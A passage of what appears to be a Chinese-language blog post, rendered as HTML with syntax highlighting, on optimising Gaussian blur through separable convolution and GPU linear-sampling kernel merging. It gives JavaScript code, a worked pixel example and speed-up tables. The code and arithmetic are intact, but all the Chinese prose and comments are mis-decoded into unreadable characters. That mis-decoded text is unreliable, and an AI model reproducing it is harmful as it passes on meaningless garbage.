      <span class="hljs-keyword">const</span> outIdx = (y * width + x) * <span class="hljs-number">4</span>;
      output[outIdx] = r;
      output[outIdx + <span class="hljs-number">1</span>] = g;
      output[outIdx + <span class="hljs-number">2</span>] = b;
      output[outIdx + <span class="hljs-number">3</span>] = a;
    }
  }

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageData</span>(output, width, height);
}

<span class="hljs-comment">// å®Œæ•´çš„é«˜æ–¯æ¨¡ç³Š</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">gaussianBlur</span>(<span class="hljs-params">imageData, radius, sigma</span>) {
  <span class="hljs-keyword">const</span> kernel = <span class="hljs-title function_">generateGaussianKernel</span>(radius, sigma);
  <span class="hljs-keyword">const</span> temp = <span class="hljs-title function_">blurHorizontal</span>(imageData, kernel, radius);
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">blurVertical</span>(temp, kernel, radius);
}
</code></pre>
<p>æ³¨æ„ä»£ç ä¸­çš„è¾¹ç•Œå¤„ç†ï¼š<code>Math.min(Math.max(x + kx, 0), width - 1)</code> ç¡®ä¿é‡‡æ ·ä½ç½®ä¸ä¼šè¶…å‡ºå›¾åƒèŒƒå›´ï¼Œè¶…å‡ºæ—¶ä½¿ç”¨è¾¹ç¼˜åƒç´ å€¼ã€‚</p>
<h3 data-id="heading-8">å¯åˆ†ç¦»å·ç§¯çš„å±€é™</h3>
<p>è™½ç„¶å¯åˆ†ç¦»å·ç§¯å·²ç»å¤§å¹…æå‡äº†æ€§èƒ½ï¼Œä½†æ¯ä¸ªåƒç´ ä»ç„¶éœ€è¦ <code>2 * (2r + 1)</code> æ¬¡é‡‡æ ·ã€‚å½“åŠå¾„è¾ƒå¤§æ—¶ï¼ˆæ¯”å¦‚ <code>r = 20</code>ï¼Œéœ€è¦ 82 æ¬¡é‡‡æ ·ï¼‰ï¼Œæ€§èƒ½ä¾ç„¶æ˜¯ä¸ªé—®é¢˜ï¼Œå°¤å…¶æ˜¯åœ¨å®æ—¶æ¸²æŸ“åœºæ™¯ä¸­ã€‚</p>
<p>è¿™å°±å¼•å‡ºäº†æœ¬æ–‡çš„æ ¸å¿ƒï¼š<strong>çº¿æ€§é‡‡æ ·ä¼˜åŒ–</strong>ã€‚é€šè¿‡åˆ©ç”¨ GPU çš„çº¹ç†æ’å€¼ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠé‡‡æ ·æ¬¡æ•°å†å‡å°‘ä¸€åŠï¼Œåœ¨å‡ ä¹ä¸æŸå¤±è´¨é‡çš„å‰æä¸‹è¿›ä¸€æ­¥æå‡æ€§èƒ½ã€‚</p>
<h2 data-id="heading-9">çº¿æ€§é‡‡æ ·ä¼˜åŒ–æŠ€æœ¯</h2>
<p>å¯åˆ†ç¦»å·ç§¯å·²ç»æŠŠæ€§èƒ½æå‡äº†ä¸€ä¸ªæ•°é‡çº§ï¼Œä½†è¿˜èƒ½æ›´å¿«å—ï¼Ÿçº¿æ€§é‡‡æ ·ä¼˜åŒ–åˆ©ç”¨ GPU çº¹ç†æ’å€¼çš„ç¡¬ä»¶ç‰¹æ€§ï¼ŒæŠŠç›¸é‚»çš„ä¸¤æ¬¡é‡‡æ ·åˆå¹¶æˆä¸€æ¬¡ï¼Œå†æ¬¡å°†é‡‡æ ·æ¬¡æ•°å‡åŠã€‚</p>
<h3 data-id="heading-10">GPU çš„çº¹ç†çº¿æ€§æ’å€¼</h3>
<p>åœ¨ GPU ä¸Šè¯»å–çº¹ç†æ—¶ï¼Œå¦‚æœé‡‡æ ·åæ ‡æ˜¯å°æ•°ï¼ˆæ¯”å¦‚ 2.3ï¼‰ï¼ŒGPU ä¼šè‡ªåŠ¨åšçº¿æ€§æ’å€¼ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// é‡‡æ ·ä½ç½® 2.3</span>
<span class="hljs-selector-tag">result</span> = <span class="hljs-selector-tag">texel</span><span class="hljs-selector-attr">[2]</span> * <span class="hljs-number">0.7</span> + <span class="hljs-selector-tag">texel</span><span class="hljs-selector-attr">[3]</span> * <span class="hljs-number">0.3</span>
</code></pre>
<p>è¿™é‡Œ 0.7 å’Œ 0.3 æ˜¯æ ¹æ®å°æ•°éƒ¨åˆ†ï¼ˆ0.3ï¼‰è‡ªåŠ¨è®¡ç®—çš„æ’å€¼æƒé‡ã€‚å…³é”®æ˜¯ï¼š<strong>è¿™ä¸ªæ’å€¼æ“ä½œç”±ç¡¬ä»¶å®Œæˆï¼Œå‡ ä¹ä¸è€—æ—¶</strong>ã€‚</p>
<h3 data-id="heading-11">æ ¸å¿ƒæ€è·¯ï¼šè®© GPU å¸®æˆ‘ä»¬åŠ æƒ</h3>
<p>ä¼ ç»Ÿæ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±å¯¹ç›¸é‚»ä¸¤ä¸ªåƒç´ åˆ†åˆ«é‡‡æ ·å¹¶åŠ æƒï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¼ ç»Ÿæ–¹å¼ï¼šä¸¤æ¬¡é‡‡æ ·</span>
color = <span class="hljs-title function_">texture</span>(pos + <span class="hljs-number">1</span>) * weight1 + <span class="hljs-title function_">texture</span>(pos + <span class="hljs-number">2</span>) * weight2;
</code></pre>
<p>å¦‚æœæˆ‘ä»¬èƒ½æ‰¾åˆ°ä¸€ä¸ªä½ç½® <code>offset</code>ï¼Œè®© GPU çš„è‡ªåŠ¨æ’å€¼æ°å¥½ç­‰äºæˆ‘ä»¬æƒ³è¦çš„åŠ æƒç»“æœï¼Œå°±å¯ä»¥çœä¸‹ä¸€æ¬¡é‡‡æ ·ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¼˜åŒ–æ–¹å¼ï¼šä¸€æ¬¡é‡‡æ ·</span>
color = <span class="hljs-title function_">texture</span>(pos + offset) * combinedWeight;
</code></pre>
<h3 data-id="heading-12">æ•°å­¦æ¨å¯¼ï¼šå¦‚ä½•è®¡ç®—æ–°çš„åç§»å’Œæƒé‡</h3>
<p>å‡è®¾æˆ‘ä»¬è¦åˆå¹¶ä¸¤ä¸ªç›¸é‚»é‡‡æ ·ç‚¹ï¼š</p>
<ul>
<li>ä½ç½® <code>k</code>ï¼Œæƒé‡ <code>w1</code></li>
<li>ä½ç½® <code>k+1</code>ï¼Œæƒé‡ <code>w2</code></li>
</ul>
<p>ä¼ ç»Ÿæ–¹æ³•çš„ç»“æœæ˜¯ï¼š</p>
<pre><code class="hljs language-css" lang="css">result = pixel<span class="hljs-selector-attr">[k]</span> * w1 + pixel<span class="hljs-selector-attr">[k+1]</span> * w2
</code></pre>
<p>ç°åœ¨æˆ‘ä»¬åœ¨ä½ç½® <code>k + offset</code>ï¼ˆå…¶ä¸­ <code>0 &lt; offset &lt; 1</code>ï¼‰é‡‡æ ·ä¸€æ¬¡ï¼ŒGPU ä¼šè‡ªåŠ¨æ’å€¼ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">sample</span> = pixel[k] * (<span class="hljs-number">1</span> - <span class="hljs-literal">off</span>set) + pixel[k+<span class="hljs-number">1</span>] * <span class="hljs-literal">off</span>set
</code></pre>
<p>è¦è®© <code>sample * newWeight</code> ç­‰äºåŸæ¥çš„ç»“æœï¼Œæˆ‘ä»¬éœ€è¦ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">pixel<span class="hljs-section">[k]</span> * w1 + pixel<span class="hljs-section">[k+1]</span> * <span class="hljs-attr">w2</span> = (pixel[k] * (<span class="hljs-number">1</span> - <span class="hljs-literal">off</span>set) + pixel[k+<span class="hljs-number">1</span>] * <span class="hljs-literal">off</span>set) * newWeight
</code></pre>
<p>å±•å¼€å³è¾¹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">pixel<span class="hljs-section">[k]</span> * w1 + pixel<span class="hljs-section">[k+1]</span> * <span class="hljs-attr">w2</span> = pixel[k] * (<span class="hljs-number">1</span> - <span class="hljs-literal">off</span>set) * newWeight + pixel[k+<span class="hljs-number">1</span>] * <span class="hljs-literal">off</span>set * newWeight
</code></pre>
<p>å¯¹æ¯”ç³»æ•°ï¼Œå¾—åˆ°ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">w1</span> = (<span class="hljs-number">1</span> - <span class="hljs-literal">off</span>set) * newWeight
<span class="hljs-attr">w2</span> = <span class="hljs-literal">off</span>set * newWeight
</code></pre>
<p>ä»è¿™ä¸¤ä¸ªæ–¹ç¨‹è§£å‡ºï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">newWeight</span> = w1 + w2
<span class="hljs-attr">offset</span> = w2 / (w1 + w2)
</code></pre>
<p><strong>ç»“è®º</strong>ï¼š</p>
<ul>
<li><strong>æ–°æƒé‡</strong> = ä¸¤ä¸ªåŸæƒé‡ä¹‹å’Œ</li>
<li><strong>æ–°åç§»</strong> = ç¬¬äºŒä¸ªæƒé‡å æ¯”</li>
</ul>
<h3 data-id="heading-13">å…·ä½“ç¤ºä¾‹ï¼š7 ç‚¹å·ç§¯æ ¸çš„ä¼˜åŒ–</h3>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª <code>radius=3</code> çš„é«˜æ–¯å·ç§¯æ ¸ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> kernel = [<span class="hljs-number">0.015</span>, <span class="hljs-number">0.094</span>, <span class="hljs-number">0.235</span>, <span class="hljs-number">0.312</span>, <span class="hljs-number">0.235</span>, <span class="hljs-number">0.094</span>, <span class="hljs-number">0.015</span>];
<span class="hljs-comment">//            åç§»: -3     -2     -1      0     +1     +2     +3</span>
</code></pre>
<p>æˆ‘ä»¬ä»å·¦åˆ°å³ä¾æ¬¡ä¸¤ä¸¤åˆå¹¶ç›¸é‚»çš„é‡‡æ ·ç‚¹ï¼š</p>
<p><strong>pair 1</strong>: åç§» -3 å’Œ -2</p>
<pre><code class="hljs language-javascript" lang="javascript">w1 = <span class="hljs-number">0.015</span>, w2 = <span class="hljs-number">0.094</span>
newWeight = <span class="hljs-number">0.015</span> + <span class="hljs-number">0.094</span> = <span class="hljs-number">0.109</span>
offset = -<span class="hljs-number">3</span> + <span class="hljs-number">0.094</span> / <span class="hljs-number">0.109</span> = -<span class="hljs-number">3</span> + <span class="hljs-number">0.862</span> = -<span class="hljs-number">2.138</span>
</code></pre>
<p><strong>pair 2</strong>: åç§» -1 å’Œ 0</p>
<pre><code class="hljs language-javascript" lang="javascript">w1 = <span class="hljs-number">0.235</span>, w2 = <span class="hljs-number">0.312</span>
newWeight = <span class="hljs-number">0.235</span> + <span class="hljs-number">0.312</span> = <span class="hljs-number">0.547</span>
offset = -<span class="hljs-number">1</span> + <span class="hljs-number">0.312</span> / <span class="hljs-number">0.547</span> = -<span class="hljs-number">1</span> + <span class="hljs-number">0.570</span> = -<span class="hljs-number">0.430</span>
</code></pre>
<p><strong>pair 3</strong>: åç§» +1 å’Œ +2</p>
<pre><code class="hljs language-javascript" lang="javascript">w1 = <span class="hljs-number">0.235</span>, w2 = <span class="hljs-number">0.094</span>
newWeight = <span class="hljs-number">0.235</span> + <span class="hljs-number">0.094</span> = <span class="hljs-number">0.329</span>
offset = +<span class="hljs-number">1</span> + <span class="hljs-number">0.094</span> / <span class="hljs-number">0.329</span> = +<span class="hljs-number">1</span> + <span class="hljs-number">0.286</span> = +<span class="hljs-number">1.286</span>
</code></pre>
<p><strong>å‰©ä½™</strong>: åç§» +3ï¼ˆå•ç‹¬ä¿ç•™ï¼‰</p>
<pre><code class="hljs language-javascript" lang="javascript">offset = +<span class="hljs-number">3.0</span>;
weight = <span class="hljs-number">0.015</span>;
</code></pre>
<p>ä¼˜åŒ–åçš„é‡‡æ ·æ–¹æ¡ˆï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">[
  { <span class="hljs-attr">offset</span>: -<span class="hljs-number">2.138</span>, <span class="hljs-attr">weight</span>: <span class="hljs-number">0.109</span> },
  { <span class="hljs-attr">offset</span>: -<span class="hljs-number">0.43</span>, <span class="hljs-attr">weight</span>: <span class="hljs-number">0.547</span> },
  { <span class="hljs-attr">offset</span>: +<span class="hljs-number">1.286</span>, <span class="hljs-attr">weight</span>: <span class="hljs-number">0.329</span> },
  { <span class="hljs-attr">offset</span>: +<span class="hljs-number">3.0</span>, <span class="hljs-attr">weight</span>: <span class="hljs-number">0.015</span> },
];
</code></pre>
<p>éªŒè¯æ€»æƒé‡ï¼š<code>0.109 + 0.547 + 0.329 + 0.015 = 1.0</code> âœ“</p>
<p>ä» 7 æ¬¡é‡‡æ ·å‡å°‘åˆ° 4 æ¬¡ï¼</p>
<h3 data-id="heading-14">åƒç´ è®¡ç®—ç¤ºä¾‹</h3>
<p>ç°åœ¨ç”¨å…·ä½“åƒç´ å€¼éªŒè¯ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¸€è¡Œåƒç´ ï¼ˆå•é€šé“ï¼Œç®€åŒ–ç¤ºä¾‹ï¼‰</span>
<span class="hljs-keyword">const</span> pixels = [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">50</span>, <span class="hljs-number">70</span>, <span class="hljs-number">80</span>, <span class="hljs-number">90</span>];
<span class="hljs-comment">// ç´¢å¼•:         0   1   2   3   4   5   6</span>
<span class="hljs-comment">// ç›¸å¯¹åç§»:    -3  -2  -1   0  +1  +2  +3</span>
</code></pre>
<p><strong>ä¼ ç»Ÿæ–¹æ³•</strong>ï¼ˆ7 æ¬¡é‡‡æ ·ï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">result = pixel[-<span class="hljs-number">3</span>] * <span class="hljs-number">0.015</span>
       + pixel[-<span class="hljs-number">2</span>] * <span class="hljs-number">0.094</span>
       + pixel[-<span class="hljs-number">1</span>] * <span class="hljs-number">0.235</span>
       + pixel[<span class="hljs-number">0</span>] * <span class="hljs-number">0.312</span>
       + pixel[+<span class="hljs-number">1</span>] * <span class="hljs-number">0.235</span>
       + pixel[+<span class="hljs-number">2</span>] * <span class="hljs-number">0.094</span>
       + pixel[+<span class="hljs-number">3</span>] * <span class="hljs-number">0.015</span>

       = <span class="hljs-number">10</span> * <span class="hljs-number">0.015</span> + <span class="hljs-number">20</span> * <span class="hljs-number">0.094</span> + <span class="hljs-number">30</span> * <span class="hljs-number">0.235</span> + <span class="hljs-number">50</span> * <span class="hljs-number">0.312</span>
       + <span class="hljs-number">70</span> * <span class="hljs-number">0.235</span> + <span class="hljs-number">80</span> * <span class="hljs-number">0.094</span> + <span class="hljs-number">90</span> * <span class="hljs-number">0.015</span>

       = <span class="hljs-number">0.15</span> + <span class="hljs-number">1.88</span> + <span class="hljs-number">7.05</span> + <span class="hljs-number">15.6</span> + <span class="hljs-number">16.45</span> + <span class="hljs-number">7.52</span> + <span class="hljs-number">1.35</span>
       = <span class="hljs-number">50.0</span>
</code></pre>
<p><strong>çº¿æ€§é‡‡æ ·ä¼˜åŒ–</strong>ï¼ˆ4 æ¬¡é‡‡æ ·ï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// é‡‡æ · 1: offset=-2.138</span>
<span class="hljs-comment">// åœ¨ç›¸å¯¹åç§» -3 å’Œ -2 ä¹‹é—´æ’å€¼</span>
<span class="hljs-comment">// -2.138 = -3 + 0.862ï¼Œå°æ•°éƒ¨åˆ† 0.862</span>
sample1 = pixel[-<span class="hljs-number">3</span>] * (<span class="hljs-number">1</span> - <span class="hljs-number">0.862</span>) + pixel[-<span class="hljs-number">2</span>] * <span class="hljs-number">0.862</span>
        = <span class="hljs-number">10</span> * <span class="hljs-number">0.138</span> + <span class="hljs-number">20</span> * <span class="hljs-number">0.862</span>
        = <span class="hljs-number">1.38</span> + <span class="hljs-number">17.24</span> = <span class="hljs-number">18.62</span>

<span class="hljs-comment">// é‡‡æ · 2: offset=-0.430</span>
<span class="hljs-comment">// åœ¨ç›¸å¯¹åç§» -1 å’Œ 0 ä¹‹é—´æ’å€¼</span>
<span class="hljs-comment">// -0.430 = -1 + 0.570ï¼Œå°æ•°éƒ¨åˆ† 0.570</span>
sample2 = pixel[-<span class="hljs-number">1</span>] * (<span class="hljs-number">1</span> - <span class="hljs-number">0.570</span>) + pixel[<span class="hljs-number">0</span>] * <span class="hljs-number">0.570</span>
        = <span class="hljs-number">30</span> * <span class="hljs-number">0.430</span> + <span class="hljs-number">50</span> * <span class="hljs-number">0.570</span>
        = <span class="hljs-number">12.9</span> + <span class="hljs-number">28.5</span> = <span class="hljs-number">41.4</span>

<span class="hljs-comment">// é‡‡æ · 3: offset=+1.286</span>
<span class="hljs-comment">// åœ¨ç›¸å¯¹åç§» +1 å’Œ +2 ä¹‹é—´æ’å€¼</span>
<span class="hljs-comment">// +1.286 = +1 + 0.286ï¼Œå°æ•°éƒ¨åˆ† 0.286</span>
sample3 = pixel[+<span class="hljs-number">1</span>] * (<span class="hljs-number">1</span> - <span class="hljs-number">0.286</span>) + pixel[+<span class="hljs-number">2</span>] * <span class="hljs-number">0.286</span>
        = <span class="hljs-number">70</span> * <span class="hljs-number">0.714</span> + <span class="hljs-number">80</span> * <span class="hljs-number">0.286</span>
        = <span class="hljs-number">49.98</span> + <span class="hljs-number">22.88</span> = <span class="hljs-number">72.86</span>

<span class="hljs-comment">// é‡‡æ · 4: offset=+3.0</span>
<span class="hljs-comment">// åœ¨ç›¸å¯¹åç§» +3ï¼ˆæ•´æ•°ä½ç½®ï¼Œæ— éœ€æ’å€¼ï¼‰</span>
sample4 = pixel[+<span class="hljs-number">3</span>] = <span class="hljs-number">90</span>

<span class="hljs-comment">// åº”ç”¨æ–°æƒé‡</span>
result = sample1 * <span class="hljs-number">0.109</span>
       + sample2 * <span class="hljs-number">0.547</span>
       + sample3 * <span class="hljs-number">0.329</span>
       + sample4 * <span class="hljs-number">0.015</span>

       = <span class="hljs-number">18.62</span> * <span class="hljs-number">0.109</span> + <span class="hljs-number">41.4</span> * <span class="hljs-number">0.547</span> + <span class="hljs-number">72.86</span> * <span class="hljs-number">0.329</span> + <span class="hljs-number">90</span> * <span class="hljs-number">0.015</span>
       = <span class="hljs-number">2.03</span> + <span class="hljs-number">22.65</span> + <span class="hljs-number">23.97</span> + <span class="hljs-number">1.35</span>
       = <span class="hljs-number">50.0</span>
</code></pre>
<p>ç»“æœå®Œå…¨ä¸€è‡´ï¼è¿™è¯æ˜äº†çº¿æ€§é‡‡æ ·ä¼˜åŒ–åœ¨æ•°å­¦ä¸Šæ˜¯ç²¾ç¡®çš„ã€‚</p>
<h3 data-id="heading-15">ä»£ç å®ç°</h3>
<p>å°†å·ç§¯æ ¸è½¬æ¢ä¸ºä¼˜åŒ–çš„é‡‡æ ·æ–¹æ¡ˆï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">optimizeKernel</span>(<span class="hljs-params">kernel</span>) {
  <span class="hljs-keyword">const</span> radius = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(kernel.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>);
  <span class="hljs-keyword">const</span> optimized = [];

  <span class="hljs-comment">// ä¸¤ä¸¤åˆå¹¶</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; kernel.<span class="hljs-property">length</span>; i += <span class="hljs-number">2</span>) {
    <span class="hljs-keyword">if</span> (i + <span class="hljs-number">1</span> &lt; kernel.<span class="hljs-property">length</span>) {
      <span class="hljs-keyword">const</span> w1 = kernel[i];
      <span class="hljs-keyword">const</span> w2 = kernel[i + <span class="hljs-number">1</span>];
      <span class="hljs-keyword">const</span> wSum = w1 + w2;

      <span class="hljs-comment">// è®¡ç®—åç§»ï¼ˆç›¸å¯¹äºä¸­å¿ƒï¼‰</span>
      <span class="hljs-keyword">const</span> baseOffset = i - radius;
      <span class="hljs-keyword">const</span> offset = baseOffset + w2 / wSum;

      optimized.<span class="hljs-title function_">push</span>({ offset, <span class="hljs-attr">weight</span>: wSum });
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// å¥‡æ•°ä¸ªå…ƒç´ ï¼Œæœ€åä¸€ä¸ªå•ç‹¬</span>
      optimized.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">offset</span>: i - radius,
        <span class="hljs-attr">weight</span>: kernel[i],
      });
    }
  }

  <span class="hljs-keyword">return</span> optimized;
}
</code></pre>
<h3 data-id="heading-16">æ€§èƒ½æå‡</h3>



































<table><thead><tr><th>åŠå¾„</th><th>ä¼ ç»Ÿé‡‡æ ·æ¬¡æ•°</th><th>çº¿æ€§é‡‡æ ·ä¼˜åŒ–</th><th>æå‡</th></tr></thead><tbody><tr><td>3</td><td>7</td><td>4</td><td>1.75x</td></tr><tr><td>5</td><td>11</td><td>6</td><td>1.83x</td></tr><tr><td>10</td><td>21</td><td>11</td><td>1.91x</td></tr><tr><td>20</td><td>41</td><td>21</td><td>1.95x</td></tr></tbody></table>
<p>é…åˆå¯åˆ†ç¦»å·ç§¯ï¼Œä»åŸå§‹äºŒç»´å·ç§¯åˆ°çº¿æ€§é‡‡æ ·ä¼˜åŒ–çš„æ€»æå‡ï¼š</p>





























<table><thead><tr><th>åŠå¾„</th><th>äºŒç»´å·ç§¯</th><th>æœ€ç»ˆä¼˜åŒ–</th><th>æ€»æå‡</th></tr></thead><tbody><tr><td>3</td><td>49</td><td>8</td><td><strong>6.1x</strong></td></tr><tr><td>10</td><td>441</td><td>22</td><td><strong>20x</strong></td></tr><tr><td>20</td><td>1681</td><td>42</td><td><strong>40x</strong></td></tr></tbody></table>
<h2 data-id="heading-17">æ ¸å¿ƒç®—æ³•å‡½æ•°</h2>
<p>åœ¨å±•ç¤ºå®Œæ•´ä»£ç å‰ï¼Œå…ˆçœ‹å…³é”®å‡½æ•°çš„å®ç°ã€‚</p>
<h3 data-id="heading-18">ç”Ÿæˆé«˜æ–¯å·ç§¯æ ¸</h3>
<p>æ— è®ºä¼ ç»Ÿæ–¹æ³•è¿˜æ˜¯ä¼˜åŒ–æ–¹æ³•ï¼Œéƒ½éœ€è¦å…ˆç”Ÿæˆé«˜æ–¯å·ç§¯æ ¸ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">generateGaussianKernel</span>(<span class="hljs-params">radius, sigma</span>) {
  <span class="hljs-keyword">const</span> kernelSize = <span class="hljs-number">2</span> * radius + <span class="hljs-number">1</span>;
  <span class="hljs-keyword">const</span> kernel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(kernelSize);
  <span class="hljs-keyword">let</span> sum = <span class="hljs-number">0</span>;

  <span class="hljs-comment">// è®¡ç®—æ¯ä¸ªä½ç½®çš„é«˜æ–¯æƒé‡</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; kernelSize; i++) {
    <span class="hljs-keyword">const</span> x = i - radius;
    kernel[i] = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">exp</span>(-(x * x) / (<span class="hljs-number">2</span> * sigma * sigma));
    sum += kernel[i];
  }

  <span class="hljs-comment">// å½’ä¸€åŒ–ï¼šç¡®ä¿æƒé‡å’Œä¸º 1</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; kernelSize; i++) {
    kernel[i] /= sum;
  }

  <span class="hljs-keyword">return</span> kernel;
}
</code></pre>
<h3 data-id="heading-19">ä¼ ç»Ÿå¯åˆ†ç¦»å·ç§¯ï¼ˆæ°´å¹³æ–¹å‘ï¼‰</h3>
<p>ä¼ ç»Ÿæ–¹æ³•ç›´æ¥ä½¿ç”¨å·ç§¯æ ¸è¿›è¡ŒåŠ æƒæ±‚å’Œï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">blurHorizontal</span>(<span class="hljs-params">imageData, kernel, radius</span>) {
  <span class="hljs-keyword">const</span> { width, height, data } = imageData;
  <span class="hljs-keyword">const</span> output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8ClampedArray</span>(data.<span class="hljs-property">length</span>);

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> y = <span class="hljs-number">0</span>; y &lt; height; y++) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> x = <span class="hljs-number">0</span>; x &lt; width; x++) {
      <span class="hljs-keyword">let</span> r = <span class="hljs-number">0</span>,
        g = <span class="hljs-number">0</span>,
        b = <span class="hljs-number">0</span>,
        a = <span class="hljs-number">0</span>;

      <span class="hljs-comment">// éå† 2*radius+1 ä¸ªé‡‡æ ·ç‚¹</span>
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> kx = -radius; kx &lt;= radius; kx++) {
        <span class="hljs-keyword">const</span> px = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(x + kx, <span class="hljs-number">0</span>), width - <span class="hljs-number">1</span>);
        <span class="hljs-keyword">const</span> idx = (y * width + px) * <span class="hljs-number">4</span>;
        <span class="hljs-keyword">const</span> weight = kernel[kx + radius];

        r += data[idx] * weight;
        g += data[idx + <span class="hljs-number">1</span>] * weight;
        b += data[idx + <span class="hljs-number">2</span>] * weight;
        a += data[idx + <span class="hljs-number">3</span>] * weight;
      }

      <span class="hljs-keyword">const</span> outIdx = (y * width + x) * <span class="hljs-number">4</span>;
      output[outIdx] = r;
      output[outIdx + <span class="hljs-number">1</span>] = g;
      output[outIdx + <span class="hljs-number">2</span>] = b;
      output[outIdx + <span class="hljs-number">3</span>] = a;
    }
  }

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageData</span>(output, width, height);
}
</code></pre>
<p>å‚ç›´æ–¹å‘ç±»ä¼¼ï¼Œåªæ˜¯æ”¹å˜é‡‡æ ·æ–¹å‘ã€‚</p>
<h3 data-id="heading-20">ä¼˜åŒ–å·ç§¯æ ¸è½¬æ¢</h3>
<p>å°†ä¼ ç»Ÿå·ç§¯æ ¸è½¬æ¢ä¸ºä¼˜åŒ–çš„é‡‡æ ·æ–¹æ¡ˆï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">optimizeKernel</span>(<span class="hljs-params">kernel</span>) {
  <span class="hljs-keyword">const</span> radius = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(kernel.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>);
  <span class="hljs-keyword">const</span> optimized = [];

  <span class="hljs-comment">// ä¸¤ä¸¤åˆå¹¶ç›¸é‚»é‡‡æ ·ç‚¹</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; kernel.<span class="hljs-property">length</span>; i += <span class="hljs-number">2</span>) {
    <span class="hljs-keyword">if</span> (i + <span class="hljs-number">1</span> &lt; kernel.<span class="hljs-property">length</span>) {
      <span class="hljs-keyword">const</span> w1 = kernel[i];
      <span class="hljs-keyword">const</span> w2 = kernel[i + <span class="hljs-number">1</span>];
      <span class="hljs-keyword">const</span> wSum = w1 + w2;
      <span class="hljs-keyword">const</span> baseOffset = i - radius;
      <span class="hljs-comment">// è®¡ç®—æ–°çš„åç§»ä½ç½®ï¼ˆåˆ©ç”¨ GPU çº¿æ€§æ’å€¼ï¼‰</span>
      <span class="hljs-keyword">const</span> offset = baseOffset + w2 / wSum;

      optimized.<span class="hljs-title function_">push</span>({ offset, <span class="hljs-attr">weight</span>: wSum });
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// å¥‡æ•°ä¸ªå…ƒç´ ï¼Œæœ€åä¸€ä¸ªå•ç‹¬ä¿ç•™</span>
      optimized.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">offset</span>: i - radius,
        <span class="hljs-attr">weight</span>: kernel[i],
      });
    }
  }

  <span class="hljs-keyword">return</span> optimized;
}
</code></pre>
<h3 data-id="heading-21">çº¿æ€§é‡‡æ ·ä¼˜åŒ–ï¼ˆæ°´å¹³æ–¹å‘ï¼‰</h3>
<p>ä½¿ç”¨ä¼˜åŒ–åçš„é‡‡æ ·æ–¹æ¡ˆï¼Œæ¨¡æ‹Ÿ GPU çº¿æ€§æ’å€¼ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">blurHorizontalOptimized</span>(<span class="hljs-params">imageData, optimized</span>) {
  <span class="hljs-keyword">const</span> { width, height, data } = imageData;
  <span class="hljs-keyword">const</span> output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8ClampedArray</span>(data.<span class="hljs-property">length</span>);

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> y = <span class="hljs-number">0</span>; y &lt; height; y++) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> x = <span class="hljs-number">0</span>; x &lt; width; x++) {
      <span class="hljs-keyword">let</span> r = <span class="hljs-number">0</span>,
        g = <span class="hljs-number">0</span>,
        b = <span class="hljs-number">0</span>,
        a = <span class="hljs-number">0</span>;

